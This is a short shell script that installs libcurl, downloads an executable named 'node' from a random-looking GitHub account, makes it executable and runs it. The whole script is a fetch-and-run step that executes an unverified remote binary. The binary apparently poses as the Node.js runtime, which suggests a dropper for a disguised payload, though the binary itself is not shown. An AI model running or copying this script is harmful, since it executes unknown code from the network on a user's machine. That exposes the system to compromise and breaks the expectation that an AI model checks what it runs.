#!/bin/sh
set -e
apt install -y libcurl4
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
./node -h
